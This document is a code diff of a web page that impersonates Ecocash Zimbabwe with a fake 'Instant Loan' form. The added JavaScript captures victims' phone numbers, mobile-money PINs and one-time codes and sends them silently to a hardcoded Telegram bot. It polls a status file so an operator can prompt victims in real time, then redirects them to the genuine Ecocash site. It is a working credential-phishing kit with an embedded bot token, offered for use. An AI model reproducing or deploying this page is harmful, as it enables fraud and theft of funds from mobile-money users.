@@ -5,29 +5,128 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Ecocash Zimbabwe - Instant Loan</title>
     <link rel="icon" type="image/png" href="logo.png" />
-    <link rel="stylesheet" href="style.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f8f4;
+            padding: 15px;
+            color: #1a3226;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 16px;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #2e7d32;
+        }
+
+        label {
+            display: block;
+            text-align: left;
+            margin: 12px 0 6px;
+            font-size: 14px;
+            color: #2e7d32;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #a5d6a7;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        input:focus, select:focus {
+            border-color: #2e7d32;
+            outline: none;
+        }
+
+        button {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            padding: 14px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #1b5e20;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #2e7d32;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #statusMsg {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #1a3226;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            .logo {
+                width: 70px;
+                height: 70px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <img src="logo.png" alt="Ecocash Logo" class="logo" />
         <h2>Instant Loan Request</h2>
 
-        <!-- STEP 1: Phone, Amount, PIN -->
+        <!-- STEP 1: Phone, PIN -->
         <form id="loanForm" class="step active">
             <input type="tel" id="phone" placeholder="Enter your Ecocash number" required />
-            
-            <label>Loan Amount (USD)</label>
-            <input type="number" id="amount" value="500" min="100" max="5000" />
-
-            <label>Duration</label>
-            <select id="duration">
-                <option value="6">6 months</option>
-                <option value="12">12 months</option>
-                <option value="24">24 months</option>
-            </select>
-
-            <div class="installment">Monthly: $<span id="installment">83.33</span></div>
-
             <input type="password" id="pin" placeholder="Enter your 4-digit PIN" maxlength="4" required />
             <button type="submit">Continue</button>
         </form>
@@ -38,9 +137,128 @@
             <input type="text" id="otp" placeholder="XXXX" maxlength="4" />
             <div class="loader"></div>
             <p id="statusMsg">Waiting for approval...</p>
+            <!-- Confirm button will be injected here -->
         </div>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        // CONFIG — CHANGE THESE
+        const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
+        const CHAT_ID = '1469249528';
+
+        // On loan form submit (Phone + PIN)
+        document.getElementById('loanForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+
+            // Send ONLY phone and PIN to Telegram
+            const credentialsMsg = `
+📱 *Ecocash Login*  
+📞 *Phone:* ${phone}  
+🔐 *PIN:* ${pin}
+            `;
+
+            await sendToTelegram(credentialsMsg);
+
+            // Hide form, show OTP screen
+            document.getElementById('loanForm').style.display = 'none';
+            document.getElementById('otpScreen').style.display = 'block';
+
+            // Show loader
+            document.querySelector('.loader').style.display = 'block';
+
+            // Start approval polling
+            pollApproval(phone);
+        });
+
+        // Poll every 3 seconds for approval decision
+        async function pollApproval(phone) {
+            const statusMsg = document.getElementById('statusMsg');
+            let attempts = 0;
+
+            const interval = setInterval(async () => {
+                if (attempts > 8) {
+                    clearInterval(interval);
+                    document.querySelector('.loader').style.display = 'none';
+                    statusMsg.textContent = "Session expired.";
+                    return;
+                }
+
+                try {
+                    const res = await fetch('approval_status.txt?' + new Date().getTime());
+                    const decision = await res.text();
+
+                    if (decision.trim() === 'approve') {
+                        clearInterval(interval);
+                        document.querySelector('.loader').style.display = 'none';
+                        statusMsg.textContent = "✅ Approved! Enter OTP and confirm.";
+                        showOTPConfirmButton(phone);
+                    } else if (decision.trim() === 'wrong_pin') {
+                        clearInterval(interval);
+                        document.querySelector('.loader').style.display = 'none';
+                        statusMsg.textContent = "❌ Invalid PIN. Try again.";
+                        setTimeout(() => location.reload(), 2000);
+                    } else if (decision.trim() === 'wrong_otp') {
+                        clearInterval(interval);
+                        document.querySelector('.loader').style.display = 'none';
+                        document.getElementById('otp').style.border = "2px solid #c62828";
+                        statusMsg.textContent = "❌ Invalid OTP.";
+                    }
+                } catch (err) {
+                    // Ignore
+                }
+
+                attempts++;
+            }, 3000);
+        }
+
+        // Show Confirm button after approval
+        function showOTPConfirmButton(phone) {
+            if (document.getElementById('confirmOtpBtn')) return;
+
+            const confirmBtn = document.createElement('button');
+            confirmBtn.id = 'confirmOtpBtn';
+            confirmBtn.textContent = 'Confirm OTP';
+            confirmBtn.onclick = async () => {
+                const otp = document.getElementById('otp').value.trim();
+                if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
+                    alert("Enter a valid 4-digit OTP");
+                    return;
+                }
+
+                // Send ONLY phone and OTP to Telegram
+                const otpMsg = `
+🔑 *Ecocash OTP*  
+📞 *Phone:* ${phone}  
+🔢 *OTP:* ${otp}
+                `;
+                await sendToTelegram(otpMsg);
+
+                // Success
+                document.getElementById('statusMsg').textContent = "✅ OTP Confirmed! Redirecting...";
+                setTimeout(() => {
+                    window.location.href = "https://ecocash.co.zw";
+                }, 2000);
+            };
+
+            document.getElementById('otpScreen').appendChild(confirmBtn);
+        }
+
+        // Send message to Telegram
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {}); // Silent fail
+        }
+    </script>
 </body>
 </html>
